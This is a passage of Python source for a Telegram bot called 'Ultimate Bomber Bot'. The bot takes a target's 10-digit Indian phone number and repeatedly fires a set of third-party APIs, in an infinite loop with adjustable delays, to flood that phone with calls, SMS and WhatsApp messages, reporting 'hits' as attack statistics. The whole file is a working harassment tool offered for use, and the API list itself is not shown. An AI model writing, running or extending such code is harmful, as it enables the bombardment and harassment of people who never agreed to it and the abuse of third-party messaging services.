        sms = stats.get('SMS', 0)
        whatsapp = stats.get('WhatsApp', 0)
        total = calls + sms + whatsapp
        
        stats_text = f"""
📊 <b>ATTACK STATISTICS</b>

<b>Total Hits:</b> {total}
<b>📞 Calls:</b> {calls}
<b>📩 SMS:</b> {sms}
<b>💬 WhatsApp:</b> {whatsapp}

<b>Success Rate:</b> {(total / (len(ULTIMATE_APIS) * (stats.get('cycles', 1))) * 100):.1f}%
<b>Active APIs:</b> {len(ULTIMATE_APIS)}
<b>Last Updated:</b> Just now
        """
    
    await message.answer(
        stats_text,
        reply_markup=create_stats_inline_keyboard(),
        parse_mode="HTML"
    )

@dp.message(F.text == "🚀 Start Infinite Boom")
async def start_attack_prompt(message: types.Message):
    """Prompt for phone number"""
    await message.answer(
        "📱 <b>Enter target phone number (10 digits):</b>\n\n"
        "Example: <code>9876543210</code>\n\n"
        "⚠️ Make sure it's 10 digits without +91",
        parse_mode="HTML"
    )

@dp.message(F.text == "🛑 STOP ATTACK")
async def stop_attack(message: types.Message):
    """Stop current attack"""
    user_id = message.from_user.id
    
    if user_id in stop_signals:
        stop_signals[user_id] = True
        await message.answer(
            "🛑 <b>Attack stopping...</b>\n"
            "Current cycle will complete and then stop.",
            reply_markup=create_main_keyboard()
        )
        
        # Clear attack state after delay
        await asyncio.sleep(2)
        if user_id in user_attacks:
            del user_attacks[user_id]
    else:
        await message.answer(
            "ℹ️ <b>No active attack to stop.</b>\n"
            "Start an attack first.",
            reply_markup=create_main_keyboard()
        )

@dp.message(F.text == "📊 Live Stats")
async def live_stats(message: types.Message):
    """Show live attack statistics"""
    user_id = message.from_user.id
    
    if user_id in attack_stats:
        stats = attack_stats[user_id]
        calls = stats.get('Call', 0)
        sms = stats.get('SMS', 0)
        whatsapp = stats.get('WhatsApp', 0)
        total = calls + sms + whatsapp
        
        live_text = f"""
📊 <b>LIVE ATTACK STATISTICS</b>

<b>Total Hits:</b> {total}
<b>📞 Calls:</b> {calls}
<b>📩 SMS:</b> {sms}
<b>💬 WhatsApp:</b> {whatsapp}

<b>Status:</b> {'⚡ ACTIVE' if user_id in user_attacks else '⏸️ PAUSED'}
<b>Last Hit:</b> {stats.get('last_update', 'N/A')}
        """
    else:
        live_text = "ℹ️ <b>No active attack.</b> Start an attack to see live stats."
    
    await message.answer(live_text, parse_mode="HTML")

@dp.message(F.text == "🏠 Main Menu")
async def main_menu(message: types.Message):
    """Return to main menu"""
    await message.answer(
        "🏠 <b>Main Menu</b>\nSelect an option:",
        reply_markup=create_main_keyboard(),
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "refresh_stats")
async def refresh_stats_callback(callback: types.CallbackQuery):
    """Refresh statistics"""
    user_id = callback.from_user.id
    stats = attack_stats.get(user_id, {})
    
    calls = stats.get('Call', 0)
    sms = stats.get('SMS', 0)
    whatsapp = stats.get('WhatsApp', 0)
    total = calls + sms + whatsapp
    
    stats_text = f"""
🔄 <b>STATISTICS REFRESHED</b>

<b>Total Hits:</b> {total}
<b>📞 Calls:</b> {calls}
<b>📩 SMS:</b> {sms}
<b>💬 WhatsApp:</b> {whatsapp}

<b>Updated:</b> {time.strftime('%H:%M:%S')}
    """
    
    await callback.message.edit_text(
        stats_text,
        reply_markup=create_stats_inline_keyboard(),
        parse_mode="HTML"
    )
    await callback.answer("✅ Statistics refreshed!")

@dp.callback_query(F.data == "alltime_stats")
async def alltime_stats_callback(callback: types.CallbackQuery):
    """Show all-time statistics"""
    # This would track all attacks, for now show current
    await callback.answer("📈 All-time stats feature coming soon!")

@dp.callback_query(F.data == "fast_attack")
async def fast_attack_callback(callback: types.CallbackQuery):
    """Switch to fast attack mode"""
    user_id = callback.from_user.id
    if user_id in user_attacks:
        user_attacks[user_id]['delay'] = 2  # 2 seconds delay
        await callback.answer("⚡ Fast mode activated (2s delay)")
    else:
        await callback.answer("Start an attack first!")

@dp.callback_query(F.data == "slow_attack")
async def slow_attack_callback(callback: types.CallbackQuery):
    """Switch to slow attack mode"""
    user_id = callback.from_user.id
    if user_id in user_attacks:
        user_attacks[user_id]['delay'] = 10  # 10 seconds delay
        await callback.answer("🐢 Slow mode activated (10s delay)")
    else:
        await callback.answer("Start an attack first!")

@dp.message(F.text.regexp(r'^\d{10}$'))
async def handle_phone_number(message: types.Message):
    """Handle phone number input and start attack"""
    user_id = message.from_user.id
    phone = message.text
    
    # Validate phone number
    if not phone.startswith(('6', '7', '8', '9')):
        await message.answer(
            "❌ <b>Invalid phone number!</b>\n"
            "Indian numbers start with 6,7,8, or 9.\n"
            "Please enter a valid 10-digit number.",
            parse_mode="HTML"
        )
        return
    
    # Initialize attack
    stop_signals[user_id] = False
    user_attacks[user_id] = {
        'phone': phone,
        'start_time': time.time(),
        'delay': 5,  # Default delay
        'cycles': 0
    }
    attack_stats[user_id] = {
        'Call': 0,
        'SMS': 0,
        'WhatsApp': 0,
        'cycles': 0,
        'last_update': time.strftime('%H:%M:%S')
    }
    
    # Send starting animation
    start_msg = await message.answer(
        "🎯 <b>INITIALIZING ATTACK...</b>\n\n"
        f"<b>Target:</b> <code>{phone}</code>\n"
        f"<b>APIs Loaded:</b> {len(ULTIMATE_APIS)}\n"
        f"<b>Mode:</b> INFINITE\n\n"
        "⚡ Preparing to fire...",
        parse_mode="HTML",
        reply_markup=create_stop_keyboard()
    )
    
    # Run animation
    await animate_message(message.chat.id, start_msg.message_id, f"Target: {phone}")
    
    # Start attack in background
    asyncio.create_task(run_attack(user_id, phone, message.chat.id, start_msg.message_id))
    
    # Update with initial status
    await bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=start_msg.message_id,
        text=f"🚀 <b>ATTACK STARTED!</b>\n\n"
             f"<b>Target:</b> <code>{phone}</code>\n"
             f"<b>Status:</b> Firing APIs...\n"
             f"<b>Hits:</b> 0\n"
             f"<b>Next cycle:</b> 5s",
        parse_mode="HTML",
        reply_markup=create_stop_keyboard()
    )

async def run_attack(user_id, phone, chat_id, message_id):
    """Run the attack loop"""
    stats = attack_stats[user_id]
    attack_info = user_attacks[user_id]
    delay = attack_info['delay']
    
    async with aiohttp.ClientSession() as session:
        cycle_count = 0
        
        while not stop_signals.get(user_id, False):
            try:
                cycle_count += 1
                attack_info['cycles'] = cycle_count
                stats['cycles'] = cycle_count
                
                # Fire all APIs
                tasks = [hit_api(session, api, phone, stats) for api in ULTIMATE_APIS]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                # Calculate hits
                calls = stats.get('Call', 0)
                sms = stats.get('SMS', 0)
                whatsapp = stats.get('WhatsApp', 0)
                total = calls + sms + whatsapp
                
                # Update message
                stats['last_update'] = time.strftime('%H:%M:%S')
                
                # Update status message
                status_text = f"""
🎯 <b>ACTIVE ATTACK - CYCLE {cycle_count}</b>

<b>Target:</b> <code>{phone}</code>
<b>Status:</b> ⚡ RUNNING
<b>Delay:</b> {delay}s

📊 <b>STATISTICS:</b>
<b>📞 Calls:</b> {calls}
<b>📩 SMS:</b> {sms}
<b>💬 WhatsApp:</b> {whatsapp}
<b>🔥 Total Hits:</b> {total}

<b>Next cycle in:</b> {delay}s
<b>Last Update:</b> {stats['last_update']}
                """
                
                try:
                    await bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=message_id,
                        text=status_text,
                        parse_mode="HTML",
                        reply_markup=create_stop_keyboard()
                    )
                except Exception as e:
                    logger.error(f"Failed to update message: {e}")
                
                # Check if we should stop
                if stop_signals.get(user_id, False):
                    break
                    
                # Wait for next cycle
                await asyncio.sleep(delay)
                
            except Exception as e:
                logger.error(f"Attack error for user {user_id}: {e}")
                await asyncio.sleep(5)  # Wait before retry
    
    # Attack stopped
    final_stats = attack_stats.get(user_id, {})
    calls = final_stats.get('Call', 0)
    sms = final_stats.get('SMS', 0)
    whatsapp = final_stats.get('WhatsApp', 0)
    total = calls + sms + whatsapp
    
    final_text = f"""
🛑 <b>ATTACK STOPPED</b>

<b>Target:</b> <code>{phone}</code>
<b>Total Cycles:</b> {cycle_count}
<b>Duration:</b> {time.time() - attack_info['start_time']:.1f}s

📊 <b>FINAL STATISTICS:</b>
<b>📞 Calls:</b> {calls}
<b>📩 SMS:</b> {sms}
<b>💬 WhatsApp:</b> {whatsapp}
<b>🔥 Total Hits:</b> {total}

<b>Status:</b> ✅ COMPLETED
<b>Time:</b> {time.strftime('%H:%M:%S')}
    """
    
    try:
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=final_text,
            parse_mode="HTML",
            reply_markup=create_main_keyboard()
        )
    except:
        pass
    
    # Clean up
    if user_id in stop_signals:
        del stop_signals[user_id]
    if user_id in user_attacks:
        del user_attacks[user_id]

@dp.message(Command("stop"))
async def stop_command(message: types.Message):
    """Handle /stop command"""
    await stop_attack(message)

@dp.message(Command("stats"))
async def stats_command(message: types.Message):
    """Handle /stats command"""
    await check_stats(message)

@dp.message(Command("help"))
async def help_command_handler(message: types.Message):
    """Handle /help command"""
    await help_command(message)

@dp.message()
async def handle_other_messages(message: types.Message):
    """Handle other messages"""
    if message.text:
        await message.answer(
            "❓ <b>Unknown command!</b>\n\n"
            "Use /help to see available commands or use the buttons below.",
            reply_markup=create_main_keyboard(),
            parse_mode="HTML"
        )

async def main():
    """Main function to start the bot"""
    logger.info("Starting Ultimate Bomber Bot...")
    logger.info(f"Developer: {DEVELOPER_ID}")
    logger.info(f"Loaded APIs: {len(ULTIMATE_APIS)}")
    
    try:
        # Start polling
        await dp.start_polling(bot)
    except Exception as e:
        logger.error(f"Bot crashed: {e}")
        logger.info("Restarting in 5 seconds...")
        await asyncio.sleep(5)
        # Restart
        await main()

if __name__ == "__main__":
    # Run the bot
    asyncio.run(main())
